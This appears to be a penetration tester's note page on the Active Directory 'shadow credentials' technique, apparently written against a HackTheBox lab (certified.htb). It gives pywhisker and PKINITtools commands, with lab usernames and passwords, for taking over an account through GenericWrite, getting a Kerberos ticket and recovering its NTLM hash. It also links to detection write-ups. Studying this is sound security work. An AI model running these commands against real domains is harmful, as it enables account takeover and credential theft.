+++
title = "Pentest - Active Directory - Shadow Credentials"
author = ["Kyle Bednar"]
tags = ["kerberos"]
draft = false
+++

## Shadow Credentials {#shadow-credentials}

[pywhisker](https://github.com/ShutdownRepo/pywhisker)

Abuse the GenericWrite ACL to get control of an account by adding shadow credentials:

```shell { linenos=true, linenostart=1 }
python3 /opt/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
```

The output is a PFX cert that can be used to authenticate as the user. Get a `TGT` for the user with [PKINITtools](https://github.com/dirkjanm/PKINITtools):

```shell { linenos=true, linenostart=1 }
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx vGRMeeb9.pfx certified.htb/management_svc -pfx-pass '25nQ6mg4JUTeQEjjNRE2' management_svc.ccache
```

This will create a Kerberos ticket called management_svc.ccache file, which we can export and use the key this output provides in conjunction with `getnthash.py` from the same toolkit to get the NTLM hash of the management_svc user.


### See also: [targetedKerberos](https://github.com/ShutdownRepo/targetedKerberoast)   [Targeted Kerberoast]({{< relref "targeted_kerberoast.md" >}}) {#see-also-targetedkerberos-targeted-kerberoast--targeted-kerberoast-dot-md}


### Links {#links}

[dsinternals](https://www.dsinternals.com/en/indicator-of-compromise-shadow-credentials-ntlm-relay-impacket/)
[Detecting shadow credentials](https://cyberstoph.org/posts/2022/03/detecting-shadow-credentials/)
[hacker recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
[hackingarticles](https://www.hackingarticles.in/shadow-credentials-attack/)
[medium](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
